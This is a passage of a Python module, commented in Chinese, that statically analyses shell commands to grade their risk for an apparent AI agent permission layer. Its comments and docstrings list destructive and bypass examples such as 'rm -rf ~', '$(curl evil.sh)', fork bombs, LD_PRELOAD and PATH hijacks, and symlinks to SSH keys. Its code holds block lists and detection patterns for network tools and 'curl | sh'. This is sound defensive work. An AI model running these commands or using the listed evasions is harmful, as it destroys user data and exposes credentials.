"""Shell 命令的静态风险分析。

为什么不能只用正则匹配 ``rm -rf``？因为同一个危险动作有无数种写法：
``ls && rm -rf ~``、``echo x | sh``、``$(curl evil.sh)``、``python -c "import shutil;..."``、
``find . -delete``……所以这里做三件事：

1. **词法切分**：先按 bash 的规则把 shlex 不认识的命令边界改写出来（引号外的换行、词首的 ``#`` 注释、续行、
   here-document 正文，见 ``_bash_lines``），再用 ``shlex``（尊重引号）切成 token，按 ``&& || ; | & |&`` 等拆成若干段；
2. **逐段分级**：先剥掉包装命令（``env`` / ``timeout`` / ``nice`` / ``xargs`` / ``sudo`` ……只是“换个方式执行
   同一条命令”），再按“真正执行的命令名 + 关键参数”归入 read / write / external / dangerous；
   ``sh -c '...'`` / ``eval`` 的字符串会被 **递归分析**；
3. **整体取最大**：复合命令的风险 = 各段风险的最大值；含命令替换、解释器内联代码等
   **无法静态分析** 的结构时，直接按 external 处理（宁可多问一次，也不放过）；
4. **工作区边界**：参数里出现工作区之外的绝对路径（含 ``~``、``$HOME``），即使命令本身只读也要确认——
   ``cat ~/.bashrc`` 读到的内容会进入上下文、轨迹与日志；
5. **灾难性命令**（删根目录/家目录、格式化磁盘、写块设备、fork 炸弹）单独标记 ``catastrophic``：
   权限层在 **任何模式** 下都直接拒绝，bypass 也不例外；
6. **凭证位置**（``~/.ssh``、``~/.kube``、``$KUBECONFIG`` ……，清单在 ``policy/sensitive.py``）单独标记 ``credential``，
   同样在任何模式下拒绝。匹配看两种样子：原始命令串（``sh -c`` 字符串、heredoc 里的也算），以及 shell 去掉引号、
   展开花括号之后的每个词（``~/.k''ube/config``、``~/.ku{be,}/config``）；
7. **符号链接**：传入 workspace 时，参数按真实路径再判一次（glob 按 bash 规则展开）——工作区里的 ``notes.txt``
   可能是指向 ``~/.ssh/id_rsa`` 的链接；
8. **劫持执行的写法**：“只读”命令的执行型 / 写入型选项（``rg --pre``、``awk -f``、``uniq 输入 输出``）、
   改变后续命令实际执行什么的环境变量（``PATH=.``、``LD_PRELOAD=``、``HOME=``、``GIT_*``）都不按只读放行；
9. **变量与当前目录**：命令里赋过值的变量按每种取值各分析一遍（``D=~; rm -rf $D``、``C=rm; $C -rf ~``），
   值要到运行时才知道的（``$(...)``、``read``）按位置未知处理；变量可能为空时，递归删除的目标按“为空”再判一次
   （``rm -rf $DIR/*`` 就是 ``rm -rf /*``）。``cd`` 之后的相对路径、git 读取的仓库配置按可能的当前目录判断。
   哪些变量“一定赋过值”按 bash 的语义跟踪：``||`` 之后、分支里、管道与子 shell 里的赋值不算数（见 ``_Flow``）。

这仍然不是安全边界——真正的兜底是沙箱。它的价值是让“默认放行”的范围尽量精确，降低审批疲劳。
"""

from __future__ import annotations

import functools
import glob
import itertools
import math
import os
import posixpath
import re
import shlex
from dataclasses import dataclass, field
from typing import NamedTuple

from .sensitive import CREDENTIAL_HINTS, SECRET_HINTS, sensitivity  # 与文件工具的托管基线共用一份敏感路径清单

LEVELS = ("read", "write", "external", "dangerous")
_RANK = {lvl: i for i, lvl in enumerate(LEVELS)}

READ_CMDS = {
    "ls", "cat", "head", "tail", "wc", "grep", "rg", "ag", "pwd", "echo", "printf", "which", "whoami",
    "date", "env", "printenv", "file", "stat", "du", "df", "tree", "less", "more", "sort", "uniq", "cut",
    "tr", "diff", "cmp", "md5sum", "sha256sum", "basename", "dirname", "realpath", "jq", "true", "false",
    "test", "[", "uname", "hostname", "ps", "id", "type", "column", "nl", "seq", "sleep",
}
WRITE_CMDS = {
    "mkdir", "touch", "cp", "mv", "ln", "chmod", "tee", "rmdir", "rm", "patch", "tar", "unzip", "zip",
    "gzip", "gunzip", "make", "cmake", "pytest", "go", "cargo", "mvn", "gradle", "black", "ruff", "prettier",
    "eslint", "tsc", "sed", "awk", "perl", "python", "python3", "node", "npm", "pnpm", "yarn", "uv", "pip",
    "pip3", "poetry", "bun", "deno", "java", "javac", "gcc", "clang",
}
EXTERNAL_CMDS = {"curl", "wget", "ssh", "scp", "rsync", "nc", "telnet", "ftp", "docker", "kubectl", "helm", "terraform", "aws", "gcloud", "az", "gh"}
DANGEROUS_CMDS = {"sudo", "su", "mkfs", "dd", "shutdown", "reboot", "halt", "fdisk", "mount", "umount", "chown", "killall", "crontab", "systemctl", "launchctl"}
INTERPRETERS = {"python", "python3", "node", "bash", "sh", "zsh", "perl", "ruby", "php", "deno", "bun"}
SHELLS = {"sh", "bash", "zsh", "dash", "ksh", "ash", "mksh", "fish", "csh", "tcsh"}
_FOREIGN_SHELLS = {"fish", "csh", "tcsh"}   # 语法和 sh 不同：按 sh 切分看不准，判出来的只读不算数
# 包装命令：真正执行的是后面那条命令。值为“带一个参数值的选项”
WRAPPERS: dict[str, set[str]] = {
    "env": {"-u", "--unset", "-C", "--chdir", "-S", "--split-string"}, "nice": {"-n", "--adjustment"}, "ionice": {"-c", "-n", "-t"},
    "nohup": set(), "time": set(), "command": set(), "exec": {"-a"}, "stdbuf": {"-i", "-o", "-e"},
    "timeout": {"-s", "--signal", "-k", "--kill-after"}, "xargs": {"-I", "-n", "-P", "-L", "-d", "-s", "-E", "-a"},
    "sudo": {"-u", "-g", "-C", "-D", "-h", "-p", "-U"}, "doas": {"-u", "-C"}, "caffeinate": {"-t", "-w"},
    "builtin": set(), "coproc": set(), "setsid": set(), "unbuffer": set(), "chronic": set(),
}
# 只影响输出格式的环境变量（语言、时区、颜色、终端尺寸）。其余变量都可能改变“实际执行什么”：
# PATH=. 让 ls 执行工作区里的 ./ls，LD_PRELOAD / DYLD_* 注入动态库，HOME / XDG_CONFIG_HOME / GIT_* 换掉 git 读的配置
# （core.fsmonitor 在 git status 时执行命令），RIPGREP_CONFIG_PATH 给 rg 塞 --pre，PYTHONWARNINGS 会导入模块……
# 名单列不完，所以反过来只放行这一小撮
BENIGN_ENV = re.compile(
    r"LANG|LANGUAGE|LC_[A-Z]+|TZ|TERM|COLUMNS|LINES|NO_COLOR|FORCE_COLOR|CLICOLOR(_FORCE)?|COLORTERM|CI"
    r"|TIME_STYLE|POSIXLY_CORRECT|SOURCE_DATE_EPOCH|PYTHONUNBUFFERED|PYTHONDONTWRITEBYTECODE|PYTHONIOENCODING"
    r"|PYTHONHASHSEED|RUST_BACKTRACE|NODE_ENV|CARGO_TERM_COLOR")
# git -c / --config-env 只放行这些无害的键；其余的键可能指定外部程序（core.fsmonitor、diff.external、*.textconv、
# filter.*、credential.helper ……）或引入别的配置文件（include.path）
GIT_SAFE_CONFIG = re.compile(
    r"color\.[\w.-]+|core\.(quotepath|abbrev|autocrlf|safecrlf|filemode|ignorecase|precomposeunicode)|i18n\.\w+"
    r"|log\.(date|decorate|abbrevcommit|follow|mailmap|showroot)|column\.\w+|advice\.\w+|user\.(name|email)"
    r"|init\.defaultbranch|diff\.(noprefix|mnemonicprefix|renames|algorithm|context|interhunkcontext|relative|indentheuristic)"
    r"|status\.(short|branch|showuntrackedfiles|relativepaths|aheadbehind|renames|showstash)|merge\.conflictstyle"
    r"|grep\.(linenumber|column|patterntype|extendedregexp|fullname)|(tag|branch)\.sort|versionsort\.\w+|push\.default",
    re.I)
# 复合命令的保留字：``if rm -rf ~; then ...``、``{ rm -rf ~; }`` 里真正执行的是保留字后面的命令
RESERVED = {"!", "{", "}", "if", "then", "elif", "else", "fi", "while", "until", "do", "done", "esac"}
# 命令分隔符。shlex 会把相邻的标点并成一个 token（``ls;(rm -rf ~)`` 里的 ``;(``），先按 bash 的运算符拆开再判断
SEPARATORS = {";", "&&", "||", "|", "&", "|&", ";;", ";&", ";;&", "(", ")"}
_OPERATOR = re.compile(r";;&|;;|;&|\|\||\|&|&&|&>>|&>|>>|>\||>&|<<<|<<-|<<|<&|<>|[;&|()<>]")
SAFE_ABS = {"/dev/null", "/dev/stdin", "/dev/stdout", "/dev/stderr", "/dev/zero", "/dev/urandom", "/dev/random"}
# 写文件的重定向：>&、<& 后面跟数字或 - 是复制/关闭文件描述符（2>&1），跟文件名就是写文件；<> 以读写方式打开，不存在就创建
REDIRECTS = {">", ">>", ">|", "&>", "&>>", "<>", ">&"}
_ASSIGN = re.compile(r"[A-Za-z_][A-Za-z0-9_]*\+?=.*")
_GLOB_CHARS = re.compile(r"[*?\[]")
_GLOB_LIMIT = 1024    # glob 匹配超过这么多个就不逐个确认真实位置，按工作区外处理
_GLOB_DEPTH = 3       # 含通配符的路径段超过这么多层同样不展开：*/*/*/*/x 会把整个仓库走一遍
_DURATION = re.compile(r"\d+(\.\d+)?[smhd]?")
_HOME = ("~", "$HOME", "${HOME}")
# 紧贴在短选项后面的路径：date -f/etc/passwd。/ 后面要有内容：cut -d/、awk -F/ 的 / 是分隔符
_GLUED_PATH = re.compile(r"-[A-Za-z0-9]+((?:~|\$HOME|\$\{HOME\})?/[^/].*)", re.DOTALL)
# $( ... )（允许一层嵌套括号）、反引号、<( ... ) / >( ... )
_SUBST = re.compile(r"\$\(((?:[^()]|\([^()]*\))*)\)|`([^`]*)`|[<>]\(((?:[^()]|\([^()]*\))*)\)")
_BLOCK_DEV = re.compile(r"/dev/(r?disk|sd|nvme|hd|xvd|mmcblk|vd|md|dm-|mapper/)")
_VAR_HEAD = re.compile(r"\$(?:\{[^{}]*\}|\w+|[@*#?$!-])")   # 以变量开头的词：$D/passwd、${D}x/passwd、${D:-/etc}/x
# 词里的变量引用：$NAME、${...}、特殊参数（$1、$@、$?……）。${...} 的内容再按 _PARAM 拆成名字、运算符与默认值
_VAR_REF = re.compile(r"\$(?:\{([^{}]*)\}|([A-Za-z_]\w*|[0-9@*#?$!-]))")
_PARAM = re.compile(r"([A-Za-z_]\w*|[0-9]+|[@*#?$!-])(?:(:?[-=?+])(.*))?", re.S)
_NEVER_EMPTY = {"HOME", "PWD", "?", "$", "#", "-", "0"}   # 不会为空的变量
_SAFE_SPECIAL = {"?", "$", "#", "-", "0", "!"}            # 退出码、进程号这类：不是路径
_VARIANT_LIMIT = 16   # 一段命令按变量取值最多展开成几份
_VALUE_LIMIT = 8      # 一个变量最多记几种取值，再多就记成“值未知”
_CWD_LIMIT = 8
# 一条命令连同 sh -c / eval 的递归最多逐个分析这么多段：取值里再引用变量、层层 bash -c 时组合数是 16 的三次方，
# 不设上限会把权限判定拖上几十秒。超了按灾难性处理（任何模式都拒绝）：剩下的段没分析，后面可能就跟着 rm -rf ~
_WORK_LIMIT = 1024
_OVER_BUDGET = "命令里的变量取值与嵌套组合太多，无法逐个确认它不会删除根目录、家目录或读取凭证；请拆成几条较短的命令"
_HOME_MARK = "/\0home"   # 路径运算时，家目录记成根下的一个占位目录
# shell 不展开的 $（单引号里、\$、$'...' 解出来的）：shlex 去掉引号之后就分不出来了，_bash_lines 先换成这个字符，
# 变量代入时跳过它；交给 sh -c / eval 递归分析时、写进原因与分段时换回 $
_LIT = ""
_DRIFT = "\ue025"   # IFS 的取值里有它：source 执行的脚本可能改了 IFS，见 _drift_seps
_BRACE_RANGE = re.compile(r"(?:(-?\d+)\.\.(-?\d+)|([A-Za-z])\.\.([A-Za-z]))(?:\.\.(-?\d+))?")
_BRACE_LIMIT = 64                                      # 展开结果的上限：{a,b}{a,b}…… 会指数膨胀

GIT_READ = {"status", "log", "diff", "show", "rev-parse", "ls-files", "blame", "describe", "shortlog", "ls-tree",
            "cat-file", "merge-base", "rev-list", "show-ref", "for-each-ref", "count-objects", "check-ignore", "name-rev",
            "version", "grep"}
GIT_EXTERNAL = {"push", "fetch", "pull", "clone", "ls-remote"}
# branch / tag：(会改动引用的选项, 进入“列出”模式的选项)。两者都没有、却带着位置参数时，位置参数是要新建的分支或标签名。
# 同一个字母在两个命令里意思不同：branch -a 是列出全部，tag -a 是建附注标签；branch -v 是详细列表，tag -v 是校验签名
_GIT_REFS = {
    "branch": ({"-d", "-D", "--delete", "-m", "-M", "--move", "-c", "-C", "--copy", "-f", "--force", "-u",
                "--set-upstream-to", "--unset-upstream", "--edit-description", "-t", "--track", "--no-track",
                "--create-reflog", "--recurse-submodules"},
               {"-l", "--list", "--contains", "--no-contains", "--merged", "--no-merged", "--points-at", "-v",
                "--verbose", "-a", "--all", "-r", "--remotes", "--show-current"}),
    "tag": ({"-a", "--annotate", "-s", "--sign", "-u", "--local-user", "-f", "--force", "-d", "--delete", "-m",
             "--message", "-F", "--file", "-e", "--edit", "--cleanup", "--trailer", "--create-reflog", "-v", "--verify"},
            {"-l", "--list", "-n", "--contains", "--no-contains", "--merged", "--no-merged", "--points-at"}),
}
# 能在 rm / dd / mkfs 之前再套一层的未知命令（taskset 1 rm -rf ~、strace -f rm -rf ~、uv run rm -rf ~）：
# 从这些命令名开始的参数按一条独立命令再分析一遍，只采纳“灾难性”结论
_CATASTROPHE_HEADS = {"rm", "dd", "chmod", "chown", "find", "eval", "sudo", "doas", "xargs", "env", *SHELLS}
NET_INSTALL = {("npm", "install"), ("npm", "i"), ("pnpm", "install"), ("pnpm", "add"), ("yarn", "add"), ("pip", "install"),
               ("pip3", "install"), ("uv", "add"), ("uv", "pip"), ("cargo", "install"), ("go", "get"), ("npm", "publish")}


@dataclass
class CommandAnalysis:
    command: str
    segments: list[str] = field(default_factory=list)
    level: str = "read"
    reasons: list[str] = field(default_factory=list)
    catastrophic: bool = False   # 无论什么模式都必须拒绝的命令
    catastrophic_reason: str = ""
    credential: bool = False     # 碰到凭证位置：同样无论什么模式都拒绝
    credential_reason: str = ""
    network: bool = False        # 会从网络取回内容（curl、git pull……）：输出不可信，标记污点
    # 实际执行的命令不在命令文本里：命令替换 / 进程替换藏在另一条命令的参数中，仓库配置定义的 git 驱动根本不在命令里——
    # allow 规则按前缀匹配时看不见它们
    opaque: bool = False
    # 命令里嵌着另一段要执行的代码（sh -c、eval、find -exec、解释器内联代码……）：前几个词说明不了实际执行什么，
    # “本会话总是允许”只能精确授权这一条，不能按前缀放行
    inline: bool = False
    workspace: str | None = field(default=None, repr=False)
    depth: int = field(default=0, repr=False)   # sh -c / eval 的递归深度
    # 按段的先后跟踪的 shell 状态：赋过的值（None 是运行时才知道的值）、执行到当前这段时一定赋过值的变量、
    # 导出的变量、可能的当前目录（"" 是工作区根目录，"~" 开头是家目录，None 是不知道在哪）
    vars: dict[str, list[str | None]] = field(default_factory=dict, repr=False)
    sure: set[str] = field(default_factory=set, repr=False)
    exported: set[str] = field(default_factory=set, repr=False)
    cwds: list[str | None] = field(default_factory=lambda: [""], repr=False)
    assigned: set[str] = field(default_factory=set, repr=False)   # 当前这段在本 shell 里赋了值的变量
    cache: dict = field(default_factory=dict, repr=False)          # glob 展开与真实路径
    # [还能逐个分析几段（取值组合也算）, 正在展开的别名与函数调用有几层]，整棵递归共用
    budget: list = field(default_factory=lambda: [_WORK_LIMIT, 0], repr=False)
    prefix: dict = field(default_factory=dict, repr=False)        # 当前这条命令的前置赋值（FOO=bar cmd）
    traps: list = field(default_factory=list, repr=False)          # trap 的命令与设下时一定赋过值的变量
    # 命令里定义过的别名与函数：名字 → [("alias", 值) / ("func", 函数体的词，写法认不出时为 None)……]。
    # 和变量取值一样只增不减：重新定义不会抹掉之前的（分支里定义的、调用之后又改掉的），调用处每个都分析一遍
    defs: dict = field(default_factory=dict, repr=False)

    def bump(self, level: str, reason: str) -> None:
        """提升风险等级。决定最终等级的原因排在最前面（reasons[0] 就是“为什么这么判”）。"""
        reason = reason.replace(_LIT, "$")
        if reason in self.reasons:
            return
        if _RANK[level] > _RANK[self.level] or not self.reasons:
            self.level = max(self.level, level, key=lambda x: _RANK[x])
            self.reasons.insert(0, reason)
        else:
            self.reasons.append(reason)

    def flag_catastrophic(self, reason: str) -> None:
        self.bump("dangerous", reason)
        if not self.catastrophic:
            self.catastrophic, self.catastrophic_reason = True, reason.replace(_LIT, "$")

    def flag_credential(self, reason: str) -> None:
        self.bump("dangerous", reason)
        if not self.credential:
            self.credential, self.credential_reason = True, reason.replace(_LIT, "$")

    @property
    def rank(self) -> int:
        return _RANK[self.level]


def analyze(command: str, workspace: str | None = None, *, _depth: int = 0, _scope: tuple | None = None) -> CommandAnalysis:
    """分析命令风险。传入 workspace 时，指向工作区内部的绝对路径按工作区内路径处理。
    ``_scope`` 是递归分析时从外层带进来的 (变量取值, 一定赋过的, 导出的, 当前目录, 路径缓存, 分析预算, 别名与函数)，
    缓存与预算整棵递归共用。"""
    a = CommandAnalysis(command=command, workspace=workspace, depth=_depth)
    if _scope:
        values, sure, exported, cwds, a.cache, a.budget, a.defs = _scope
        a.vars, a.sure, a.exported, a.cwds = {k: list(v) for k, v in values.items()}, set(sure), set(exported), list(cwds)
    if workspace:
        # 工作区根目录本身（ls /ws）和它下面的路径（cat /ws/app.py、>/ws/out、@/ws/body.json）都换成相对写法。
        # 前后都用白名单：后面只能是 / 、空白、命令分隔符或结尾——/ws*、/ws{,-other}、"/ws"-other、/ws$X 经 shell 展开后
        # 会落到工作区外，改写成 . 就成了绕过；/ws-other、/x/ws/y 这类只是字符串沾边的路径同样保持原样（按越界处理）
        root = re.escape(workspace.rstrip("/"))
        command = re.sub(rf"(?<![^\s=:'\"(<>@;|&]){root}(?=[/\s;&|<>)]|$)", ".", command)
    # 替换语法的检测直接作用于原始命令，不先“剔除单引号内容”：引号的语义依赖上下文
    # （双引号里的单引号只是普通字符，$( ) 里又会开始新的引号上下文），用正则猜引号很容易猜错，
    # 猜错就会放过真正会执行的命令。这里宁可把 echo '$(x)' 这样的字面量也当作不透明——误判的代价只是多问一次
    if "$(" in command or "`" in command:
        a.opaque = True
        a.bump("external", "包含命令替换 $(...) 或反引号，无法静态分析")
    if re.search(r"<\(|>\(", command):
        a.opaque = True
        a.bump("external", "包含进程替换，无法静态分析")
    # 替换里的命令同样会执行（即使写在双引号里）：递归分析，灾难性命令藏在 "$(...)" 里也要识别出来
    for inner in _SUBST.findall(command):
        body = next((x for x in inner if x), "")   # 空的替换（`` 或 $()）展开为空串：没有要分析的命令
        if body.strip():
            _recurse(body, a, "命令替换", mode="sub")
    _check_secrets(command, a)
    if re.search(r":\(\)\s*\{", command):
        a.flag_catastrophic("疑似 fork 炸弹")
    if re.search(r"\b(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(ba|z)?sh\b", command):
        a.bump("dangerous", "下载后直接执行（curl | sh）")

    bodies: dict[str, list[str]] = {}   # here-document 的正文，按结束符记
    try:
        lex = shlex.shlex(_bash_lines(command, bodies), posix=True, punctuation_chars=";&|<>()")
        lex.whitespace_split = True
        lex.commenters = ""  # shlex 把词中间的 # 也当注释（echo a#b; rm -rf ~ 的后半句会被吞掉）；注释已由 _bash_lines 按 bash 规则去掉
        tokens = list(lex)
    except ValueError as e:  # 引号不配对等
        a.bump("external", f"命令无法解析：{e}")
        return a

    toks = _split_operators(tokens) + [";"]
    for name, body in _function_defs(toks):   # 一开始全部登记：循环里可能先调用、下一轮才用上后面的定义
        _define(name, ("func", body), a)
        if body and _forks_itself(name, body):
            a.flag_catastrophic(f"疑似 fork 炸弹：函数 {name} 在管道或后台里调用自己")
    flow = _Flow(a)
    segment: list[str] = []
    piped: list[str] = []     # 这条管道里前面的段写到标准输入的文本（认得出的部分）
    for tok in toks:
        if tok in SEPARATORS:
            if segment:
                a.segments.append(" ".join(segment).replace(_LIT, "$"))
                flow.start(segment)
                stdin = _stdin_text(segment, bodies)
                _classify(segment, a, stdin + piped)
                flow.assigned(a.assigned)
                piped = stdin + piped + _echoed(segment) if tok in ("|", "|&") else []
                segment = []
            flow.separator(tok)
            if tok == "&":
                a.bump("write", "后台执行（&）")
            continue
        segment.append(tok)
    # trap 的命令在之后某个时刻执行：变量取值算上整条命令赋过的，“一定赋过值”只认设 trap 时与结束时都一定赋过的
    final = set(flow.stmt)
    for body, sure in a.traps:
        a.sure = sure & final
        _recurse(body, a, "trap", mode="sub")
    a.sure = final   # eval 在当前 shell 里执行：外层据此知道哪些变量一定赋过值
    return a


class _Flow:
    """执行到每一段时，哪些变量一定赋过值（写进 ``a.sure``；变量可能为空时，``rm -rf $D/*`` 就是 ``rm -rf /*``）。

    按 bash 的语义合并：``a && b`` 里 b 执行时 a 一定成功了，``a || b`` 里 b 执行时 a 一定失败了；
    管道、后台与子 shell 里的赋值留不到后面；if / while / case 分支里的赋值出了复合命令就不算（分支可能没走），
    ``{ ...; }`` 里的照常算；for 的循环变量只在循环体里算。"""

    def __init__(self, a: CommandAnalysis):
        self.a = a
        self.stack: list[tuple] = []        # 进入的复合命令：(种类, 进入时一定赋过的, 循环变量, 外层的状态)
        self.stmt: set[str] = set(a.sure)   # 一条语句开始时一定赋过的
        self.ok: set[str] | None = None     # 与或列表到目前为止成功 / 失败时一定赋过的
        self.fail: set[str] | None = None
        self.op: str | None = None          # 当前元素前面的 && 或 ||
        self.pipe: set[str] | None = None   # 管道开始时一定赋过的：管道里每一段都在子 shell 里
        self.cur: tuple | None = None       # 刚执行完、还没并进与或列表的元素：(执行时一定赋过的, 它赋值的)

    def _run(self) -> set[str]:
        if self.pipe is not None:
            return self.pipe
        if self.op == "&&" and self.ok is not None:
            return self.ok
        if self.op == "||" and self.fail is not None:
            return self.fail
        return self.stmt

    def start(self, words: list[str]) -> None:
        """一段开始：段首的保留字进出复合命令，之后还有命令时，它是与或列表里的一个元素。"""
        self.a.assigned = set()
        i, closed = 0, False
        while i < len(words):
            w = words[i]
            if w in ("if", "while", "until", "{", "case", "for", "select"):
                self._open(w, words[i + 1] if w in ("for", "select") and i + 1 < len(words) else None)
                if w in ("case", "for", "select"):   # 后面是 case 的对象或循环的取值，不是命令
                    self.a.sure = set(self.stmt)
                    return
            elif w in ("then", "else", "elif", "do"):
                self._branch(loop=w == "do")
            elif w in ("fi", "done", "esac", "}"):
                self._close()
                closed = True
            elif w == "function":
                i += 1
            elif w != "!":
                break
            i += 1
        if i == len(words) or closed:   # 整段都是保留字，或者复合命令结尾的重定向（done < list、} > out）
            self.a.sure = set(self.stmt)
            return
        run = set(self._run())
        self.a.sure, self.cur = set(run), (run, set())

    def assigned(self, names: set[str]) -> None:
        if self.cur is not None:   # 并上：复合命令收尾时 _close 已经记下了 { ...; } 里的赋值
            self.cur = (self.cur[0], self.cur[1] | names)

    def separator(self, tok: str) -> None:
        in_case = bool(self.stack) and self.stack[-1][0] == "case"
        if tok in ("(", ")", ";;", ";&", ";;&"):
            self._done(";")
            if in_case:   # case 的模式 a) 与分支结尾 ;;
                self._branch()
            elif tok == "(":
                self._open("(")
            elif tok == ")":
                self._close()
        else:
            self._done(tok)

    def _done(self, sep: str) -> None:
        if self.cur is None:
            return
        run, assigned = self.cur
        self.cur = None
        if sep in ("|", "|&"):
            if self.pipe is None:
                self.pipe = run
            return
        if self.pipe is not None:   # 管道到此结束：每一段都在子 shell 里，赋值不算数
            run, assigned, self.pipe = self.pipe, set(), None
        ok, fail = run | assigned, run | assigned   # 执行了就赋上了值，与成败无关（X=$(false) 失败了 X 也是空串）
        if self.op == "&&" and self.fail is not None:     # 失败：前面已经失败、跳过了它，或者它自己失败
            fail &= self.fail
        elif self.op == "||" and self.ok is not None:     # 成功：前面已经成功、跳过了它，或者它执行成功
            ok &= self.ok
        if sep in ("&&", "||"):
            self.ok, self.fail, self.op = ok, fail, sep
            return
        if sep != "&":   # 放到后台的整个列表在子 shell 里执行
            self.stmt = ok & fail
        self.ok = self.fail = self.op = None

    def _open(self, kind: str, loopvar: str | None = None) -> None:
        run = set(self._run())
        self.stack.append((kind, run, loopvar, (self.stmt, self.ok, self.fail, self.op, self.pipe)))
        self.stmt, self.ok, self.fail, self.op, self.pipe, self.cur = set(run), None, None, None, None, None

    def _branch(self, loop: bool = False) -> None:
        if self.stack:
            _, entry, loopvar, _ = self.stack[-1]
            self.stmt = entry | ({loopvar} if loop and loopvar else set())
            self.ok = self.fail = self.op = self.pipe = self.cur = None

    def _close(self) -> None:
        if not self.stack:
            return
        kind, entry, _, outer = self.stack.pop()
        inner = self.stmt
        self.stmt, self.ok, self.fail, self.op, self.pipe = outer
        self.cur = (entry, inner - entry if kind == "{" else set())


def _stdin_text(seg: list[str], bodies: dict[str, list[str]]) -> list[str]:
    """这段命令自带的标准输入：here-string 的内容、here-document 的正文。shlex 把 ``<<-EOF`` 切成 ``<<`` 和 ``-EOF``，
    ``<<- EOF`` 切成三个词，所以往后看两个词。"""
    out: list[str] = []
    for i, w in enumerate(seg):
        if w == "<<<":
            out += seg[i + 1:i + 2]
        elif w in ("<<", "<<-"):
            for d in seg[i + 1:i + 3]:
                out += bodies.get(d) or bodies.get(d.removeprefix("-"), [])
    return out


def _echoed(seg: list[str]) -> list[str]:
    """``echo`` / ``printf`` 写到标准输出的文本：``echo 'rm -rf ~' | sh``。别的命令的输出看不到，按原来的“内容无法静态分析”处理。"""
    return [" ".join(_no_redirects(seg[1:]))] if seg[0] in ("echo", "printf") else []


def _no_redirects(words: list[str]) -> list[str]:
    """去掉重定向：运算符、它的目标，以及紧贴在前面的文件描述符（``2>/dev/null`` 切出来是三个词）。"""
    out: list[str] = []
    skip = False
    for w in words:
        if skip:
            skip = False
        elif _OPERATOR.fullmatch(w):
            skip = True
            if out and out[-1].isdigit():
                out.pop()
        else:
            out.append(w)
    return out


def _forks_itself(name: str, body: list[str]) -> bool:
    """函数在命令位置不带参数地调用自己至少两次，又放进了管道或后台：调用次数指数增长（``:(){ :|:& };:`` 及其改名）。
    只调用一次的是普通递归（``poll() { sleep 1; poll & }``），带参数的可能收敛（目录遍历）。"""
    forks = {"|", "|&", "&"}
    calls = [i for i, t in enumerate(body) if t == name and (i == 0 or body[i - 1] in SEPARATORS or body[i - 1] in RESERVED)
             and (i + 1 == len(body) or body[i + 1] in SEPARATORS)]
    return len(calls) >= 2 and any(i and body[i - 1] in forks or body[i + 1:i + 2] and body[i + 1] in forks for i in calls)


def _split_operators(tokens: list[str]) -> list[str]:
    """shlex 把连续的标点并成一个 token：``;(``、``&&(``、``)>``。按 bash 的运算符重新拆开，分隔符才认得出来。"""
    out: list[str] = []
    for tok in tokens:
        if tok and not tok.strip(";&|<>()"):
            out.extend(_OPERATOR.findall(tok))
        else:
            out.append(tok)
    return out


def _bash_lines(cmd: str, bodies: dict[str, list[str]] | None = None) -> str:
    """把 bash 认作命令边界、shlex 却看不出来的结构改写成 shlex 认得的样子。

    shlex 把换行当普通空白，bash 却把引号外的换行当命令分隔符：``echo safe⏎touch x`` 在分析器眼里是一条只读 echo，
    执行时却是两条命令。这里按 bash 的规则扫一遍（引号、``$( )``、反引号、``$(( ))`` 分别跟踪上下文）：

    - 引号外的换行 → `` ; ``；``\\``+换行是续行，直接去掉；
    - 词首的 ``#`` 到行尾是注释，去掉（``a#b`` 里的 # 不是注释）；
    - here-document 的正文是喂给命令的数据，不是命令，去掉。找不到结束符时不去掉，正文按命令分析——
      宁可多问，也不能把真正会执行的行当成数据。正文里的凭证路径、``$( )`` 仍由 analyze() 对原始命令串的检查覆盖。
      传入 bodies 时按结束符记下正文：命令是从标准输入读脚本的 shell 时，正文就是要执行的代码，见 _stdin_text。

    - ``$'...'``（ANSI-C 引号）按 C 转义解码后换成普通单引号：shlex 不认识它，``$'\\x72m' -rf ~`` 执行的就是 ``rm -rf ~``。
    - shell 不展开的 ``$``（单引号里、``\\$``）换成 _LIT：``sh -c 'rm -rf $D/*'`` 里的 $D 由子 shell 展开，不是当前 shell。

    引号不配对时原样交给 shlex，由它报“无法解析”。
    """
    if "\n" not in cmd and "#" not in cmd and "$'" not in cmd and not ("$" in cmd and ("'" in cmd or "\\" in cmd)):
        return cmd
    out: list[str] = []
    stack: list[str] = []                      # 上下文：引号 "'"、'"'、"$'"；命令 "`"、"$("、"("；算术 "(("、"a("
    heredocs: list[tuple[str, bool, bool]] = []   # 本行登记的 here-document：(结束符, 是否 <<-, 结束符是否带引号)
    i, n = 0, len(cmd)
    while i < n:
        c, top = cmd[i], (stack[-1] if stack else "")
        if top == "'":
            if c == "'":
                stack.pop()
            out.append(_LIT if c == "$" else c)
            i += 1
            continue
        if top in ('"', "$'", "`") and c == "\\" and i + 1 < n:
            out.append(_LIT if top == '"' and cmd[i + 1] == "$" else cmd[i:i + 2])   # 转义的引号不结束字符串
            i += 2
            continue
        if top == "$'":
            if c == "'":
                stack.pop()
            out.append(c)
            i += 1
            continue
        if top == '"':
            if c == '"':
                stack.pop()
            elif cmd.startswith("$(", i):         # 双引号里的 $( ) 重新开始命令上下文（引号也重新配对）
                k = 3 if cmd.startswith("$((", i) else 2
                stack.append("((" if k == 3 else "$(")
                out.append(cmd[i:i + k])
                i += k
                continue
            elif c == "`":
                stack.append("`")
            out.append(c)
            i += 1
            continue
        # ---- 命令上下文：顶层、$( )、( )、反引号、$(( ))
        if top in ("((", "a("):                 # 算术：<< 是移位、# 不是注释，只跟踪括号；换行照样拆开，不让两行粘成一条
            if top == "((" and cmd.startswith("))", i):
                stack.pop()
                out.append("))")
                i += 2
                continue
            if c == "(":
                stack.append("a(")
            elif c == ")" and top == "a(":
                stack.pop()
            out.append(" ; " if c == "\n" else c)
            i += 1
            continue
        if c == "\\" and i + 1 < n:
            if cmd[i + 1] != "\n":                # 续行：反斜杠和换行一起去掉
                out.append(_LIT if cmd[i + 1] == "$" else cmd[i:i + 2])
            i += 2
            continue
        if c == "`" and top == "`":
            stack.pop()
        elif c in "'\"`":
            stack.append(c)
        elif cmd.startswith("$'", i):
            j = i + 2
            while j < n and cmd[j] != "'":
                j += 2 if cmd[j] == "\\" else 1
            if j < n:
                out.append(shlex.quote(_ansi_c(cmd[i + 2:j]).replace("$", _LIT)))
                i = j + 1
                continue
            stack.append("$'")                    # 不配对：留给 shlex 报错
            out.append("$'")
            i += 2
            continue
        elif cmd.startswith(("$((", "(("), i):
            stack.append("((")
            k = 3 if c == "$" else 2
            out.append(cmd[i:i + k])
            i += k
            continue
        elif cmd.startswith("$(", i):
